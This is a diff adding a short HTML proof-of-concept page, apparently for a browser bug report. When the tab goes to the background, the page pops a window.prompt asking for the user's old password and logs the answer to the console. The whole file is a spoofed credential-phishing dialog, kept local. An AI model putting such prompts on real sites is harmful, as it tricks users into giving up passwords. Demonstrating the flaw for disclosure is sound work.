@@ -1,0 +1,24 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<script>
+document.addEventListener('visibilitychange', () => {
+  console.log('visibilitychange, hidden=', document.hidden);
+  if (document.hidden) {
+    try {
+      // panggil langsung (bukan via javascript: URL)
+      const r = window.prompt("RESET YOUR PASSWORD, ENTER YOUR OLD PASSWORD HERE");
+      console.log('prompt returned:', r);
+    } catch (e) {
+      console.error('prompt failed:', e);
+    }
+  }
+});
+</script>
+</head>
+<body>
+  <h3>PoC</h3>
+  <p>Open console (Web Inspector) untuk melihat log ketika background/foreground.</p>
+</body>
+</html>
